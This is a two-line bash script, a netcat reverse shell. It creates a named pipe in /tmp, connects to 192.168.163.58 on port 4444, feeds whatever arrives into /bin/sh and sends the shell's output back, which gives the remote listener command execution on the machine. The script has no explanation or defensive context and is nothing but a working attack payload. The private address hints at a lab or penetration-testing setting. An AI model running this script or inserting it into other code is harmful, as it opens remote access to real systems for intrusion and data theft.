#!/bin/bash
mkfifo /tmp/f; nc 192.168.163.58 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
